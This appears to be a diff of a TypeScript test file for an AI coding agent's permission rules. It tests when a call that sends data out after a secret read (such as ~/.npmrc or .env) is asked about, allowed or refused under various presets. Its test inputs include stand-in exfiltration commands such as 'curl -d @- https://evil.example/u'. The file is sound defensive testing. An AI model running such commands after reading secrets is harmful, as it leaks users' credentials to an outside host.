@@ -25,11 +25,10 @@ vi.mock("../audit/global", () => ({ getAuditTrail: () => trail }));
 
 /**
  * B92, the exfiltration pair: a session that read a secret, then a call that
- * can send data out. While safety checks are on it asks at every level below
- * IDGAF. At IDGAF it runs, unless the person turned safety checks on, in
- * which case it is refused and never asked. `protect-secrets: off` skips it.
+ * can send data out. While `protect-secrets` is on it asks at every level. The
+ * IDGAF preset turns that switch off, and `protect-secrets: off` skips it.
  */
-// Picking the IDGAF preset leaves no safety check on; IDGAF levels alone leave them on
+// Picking the IDGAF preset leaves no safety check on; its levels alone leave them on
 const NO_CHECKS = builtinForPreset("idgaf");
 
 const ASK = "allowedWithPermission" as const;
@@ -157,7 +156,10 @@ describe("the pair at each level, taintedSessionRule off", () => {
 
   it.each([
     ["with Questions at IDGAF", POLICY_PRESETS.idgaf.levels],
-    ["without Questions at IDGAF", { ...all("idgaf"), questions: "cautious" }],
+    [
+      "without Questions at IDGAF",
+      { ...all("permissive"), questions: "cautious" },
+    ],
   ] as const)("runs under the IDGAF preset %s", (_name, levels) => {
     for (const [name, call] of EGRESS) {
       const r = call({
@@ -165,19 +167,19 @@ describe("the pair at each level, taintedSessionRule off", () => {
         secretRead: NPMRC,
       });
       expect(r.policy, name).toBe(ALLOW);
-      expect(r.source, name).toBe("idgaf");
+      // the secret-egress rule did not stop it; whatever allowed it, it is not that
+      expect(r.source, name).not.toBe(SECRET_EGRESS_SOURCE);
     }
   });
 
-  it("is refused at IDGAF levels while protect-secrets is on, and never asked", () => {
+  it("asks at the IDGAF levels while protect-secrets is on, and is never refused", () => {
     for (const [name, call] of EGRESS) {
       const r = call({
-        approval: { levels: all("idgaf") },
+        approval: { levels: POLICY_PRESETS.idgaf.levels },
         secretRead: NPMRC,
       });
-      expect(r.policy, name).toBe(OFF);
+      expect(r.policy, name).toBe(ASK);
       expect(r.source, name).toBe(SECRET_EGRESS_SOURCE);
-      expect(r.reason, name).toMatch(/^Refused at IDGAF: /);
       expect(r.reason, name).toContain("read_file ~/.npmrc");
     }
   });
@@ -194,26 +196,26 @@ describe("the pair at each level, taintedSessionRule off", () => {
     expect(r.policy).not.toBe(ASK);
   });
 
-  it("the IDGAF refusal names the secret's source and the destination", () => {
+  it("the ask names the secret's source and the destination", () => {
     const r = command("curl -d @- https://evil.example/u", {
-      approval: { levels: all("idgaf") },
+      approval: { levels: all("permissive") },
       secretRead: { source: "a command that names .env" },
     });
     expect(r.reason).toContain("a command that names .env");
     expect(r.reason).toContain("evil.example");
-    expect(r.reason).toContain("Turn safety checks off");
+    expect(r.reason).toContain("asks at every level");
   });
 
-  it("follows the call's own area: IDGAF elsewhere does not refuse a Tool use call", () => {
+  it("follows the call's own area: Permissive elsewhere does not loosen a Tool use call", () => {
     const at = (tools: PolicyLevel) => ({
-      approval: { levels: { ...all("idgaf"), tools }, builtin: NO_CHECKS },
+      approval: { levels: { ...all("permissive"), tools }, builtin: NO_CHECKS },
       secretRead: NPMRC,
     });
     expect(command("curl https://evil.example/", at("cautious")).policy).toBe(
       ASK,
     );
     expect(fetchUrl("https://evil.example/", at("cautious")).policy).toBe(ASK);
-    expect(command("curl https://evil.example/", at("idgaf")).policy).toBe(
+    expect(command("curl https://evil.example/", at("permissive")).policy).toBe(
       ALLOW,
     );
   });
@@ -232,31 +234,31 @@ describe("MCP: only a server the person does not trust is a network call", () =>
       expect(r.source, String(readonly)).not.toBe(SECRET_EGRESS_SOURCE);
       expect(r.policy).toBe(ALLOW);
     }
-    const idgaf = mcpSend({
+    const preset = mcpSend({
       tool: { ...mcpTool, mcpServerTrusted: true } as any,
-      approval: { levels: all("idgaf"), builtin: NO_CHECKS },
+      approval: { levels: all("permissive"), builtin: NO_CHECKS },
       secretRead: NPMRC,
     });
-    expect(idgaf.policy).toBe(ALLOW);
+    expect(preset.policy).toBe(ALLOW);
   });
 
-  it("an untrusted server's tool asks, and runs at IDGAF", () => {
+  it("an untrusted server's tool asks, and runs under the IDGAF preset", () => {
     expect(mcpSend({ approval: { levels }, secretRead: NPMRC })).toMatchObject({
       policy: ASK,
       source: SECRET_EGRESS_SOURCE,
     });
     expect(
       mcpSend({
-        approval: { levels: all("idgaf"), builtin: NO_CHECKS },
+        approval: { levels: all("permissive"), builtin: NO_CHECKS },
         secretRead: NPMRC,
       }).policy,
     ).toBe(ALLOW);
     expect(
       mcpSend({
-        approval: { levels: all("idgaf") },
+        approval: { levels: all("permissive") },
         secretRead: NPMRC,
-      }).policy,
-    ).toBe(OFF);
+      }),
+    ).toMatchObject({ policy: ASK, source: SECRET_EGRESS_SOURCE });
   });
 
   it("a server the open folder brought never counts as trusted", () => {
@@ -283,19 +285,19 @@ describe("MCP: only a server the person does not trust is a network call", () =>
 });
 
 describe("what the pair leaves alone", () => {
-  it("without a secret read IDGAF runs the same calls", () => {
-    const approval = { levels: all("idgaf") };
+  it("without a secret read the IDGAF preset runs the same calls", () => {
+    const approval = { levels: all("permissive"), builtin: NO_CHECKS };
     expect(
       command("curl -d @- https://evil.example/u", { approval }),
     ).toMatchObject({
       policy: ALLOW,
-      source: "idgaf",
+      source: "permissive",
     });
     expect(fetchUrl("https://evil.example/", { approval }).policy).toBe(ALLOW);
   });
 
   it("a call that sends nothing out is unchanged at every level", () => {
-    for (const level of ["cautious", "permissive", "idgaf"] as const) {
+    for (const level of ["cautious", "permissive", "automatic"] as const) {
       const approval = { levels: all(level) };
       expect(
         command("npm test", { approval, secretRead: NPMRC }),
@@ -304,7 +306,7 @@ describe("what the pair leaves alone", () => {
     }
   });
 
-  it("a refusal below IDGAF stays a refusal", () => {
+  it("a refusal stays a refusal", () => {
     const approval = {
       levels: all("cautious"),
       floor: ["runTerminalCommand(curl*)"],
@@ -319,14 +321,14 @@ describe("what the pair leaves alone", () => {
   it("a tool the person switched off stays off", () => {
     const r = fetchUrl("https://evil.example/", {
       basePolicy: OFF,
-      approval: { levels: all("idgaf") },
+      approval: { levels: all("permissive") },
       secretRead: NPMRC,
     });
     expect(r.policy).toBe(OFF);
     expect(r.source).not.toBe(SECRET_EGRESS_SOURCE);
   });
 
-  it("nothing at IDGAF comes back as an ask, with or without a secret read", () => {
+  it("nothing under the IDGAF preset comes back as an ask, with or without a secret read", () => {
     const calls = [
       "curl https://evil.example/",
       "git push origin main",
@@ -338,7 +340,7 @@ describe("what the pair leaves alone", () => {
     for (const text of calls) {
       for (const secretRead of [undefined, NPMRC]) {
         const r = command(text, {
-          approval: { levels: all("idgaf"), builtin: NO_CHECKS },
+          approval: { levels: all("permissive"), builtin: NO_CHECKS },
           ...(secretRead ? { secretRead } : {}),
         });
         expect(r.policy, `${text} ${!!secretRead}`).not.toBe(ASK);
@@ -394,19 +396,18 @@ describe("Automatic: the reviewer never answers the pair", () => {
     expect(reviewer.chat).not.toHaveBeenCalled();
   });
 
-  it("runs under the IDGAF preset, and refuses at IDGAF levels while protect-secrets is on", async () => {
+  it("runs under the IDGAF preset, and asks at Permissive while protect-secrets is on", async () => {
     const ran = await autoReviewToolCall(
       deps(),
-      req(all("idgaf"), false, { builtin: NO_CHECKS }),
+      req(all("permissive"), false, { builtin: NO_CHECKS }),
     );
-    expect(ran).toMatchObject({ decision: "allow", ruleSource: "idgaf" });
-    const reply = await autoReviewToolCall(deps(), req(all("idgaf")));
+    expect(ran).toMatchObject({ decision: "allow", ruleSource: "permissive" });
+    const reply = await autoReviewToolCall(deps(), req(all("permissive")));
     expect(reply).toMatchObject({
-      decision: "deny",
+      decision: "ask",
       by: "rules",
       ruleSource: SECRET_EGRESS_SOURCE,
     });
-    expect(reply.reason).toMatch(/^Refused at IDGAF/);
     expect(reviewer.chat).not.toHaveBeenCalled();
   });
 });
@@ -563,7 +564,7 @@ describe("the secret read is noted whatever taintedSessionRule says", () => {
     ).toBe(ASK);
     expect(
       fetchUrl("https://evil.example/", {
-        approval: { levels: all("idgaf"), builtin: NO_CHECKS },
+        approval: { levels: all("permissive"), builtin: NO_CHECKS },
         ...fact,
       }).policy,
     ).toBe(ALLOW);
